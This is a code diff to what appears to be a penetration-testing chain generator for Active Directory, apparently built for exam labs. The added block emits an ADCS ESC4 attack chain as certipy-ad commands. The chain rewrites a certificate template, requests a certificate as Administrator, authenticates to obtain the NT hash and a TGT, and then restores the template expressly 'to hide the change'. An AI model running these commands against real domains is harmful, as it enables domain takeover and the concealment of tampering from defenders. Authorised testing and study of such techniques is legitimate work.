@@ -1526,6 +1526,40 @@ def run(report, store, ui=None):
                     f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                     f"# certipy prints the NT hash + TGT; PtH via R7 to any host",
                 ], src=tpl["src"], line=tpl["line"]))
+        # iter-118: R-ADCS-ESC4 - vulnerable template ACL. Certipy has a
+        # native 'template' subcommand that rewrites the template to be
+        # ESC1-shaped (client-auth EKU + enrollee-supplies-subject) and
+        # saves the original for restore. Not covered by R-ADCS-ESC1 because
+        # it needs the pre-step; but it's still exam-legal (manual, targeted).
+        _emitted_esc4 = set()
+        for tpl in e.cert_templates:
+            if tpl["lab_only"]:
+                continue
+            if "ESC4" not in tpl["esc"]:
+                continue
+            _tkey4 = (tpl["template"], tpl["ca"])
+            if _tkey4 in _emitted_esc4:
+                continue
+            _emitted_esc4.add(_tkey4)
+            _ca4 = tpl["ca"] or "<CA>"
+            _tpl_name = tpl["template"]
+            chains.append(Chain("R-ADCS-ESC4", "ADCS ESC4 -> rewrite template -> ESC1",
+                f"ESC4 template '{_tpl_name}' - operator can WriteDacl/WriteOwner it",
+                crit=9, conf=0.85, ready=1.3, prox=0.9,      # score 8.95
+                commands=[
+                    f"# 1. save original template config, then rewrite to ESC1-shape:",
+                    f"certipy-ad template -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-template '{_tpl_name}' -save-old -dc-ip {_dc_esc}",
+                    f"# 2. enroll for Administrator via the now-vuln template:",
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca4}' -template '{_tpl_name}' "
+                    f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
+                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
+                    f"# 3. restore the original config to hide the change:",
+                    f"certipy-ad template -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-template '{_tpl_name}' "
+                    f"-configuration '{_tpl_name}.json' -dc-ip {_dc_esc}",
+                ], src=tpl["src"], line=tpl["line"]))
 
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
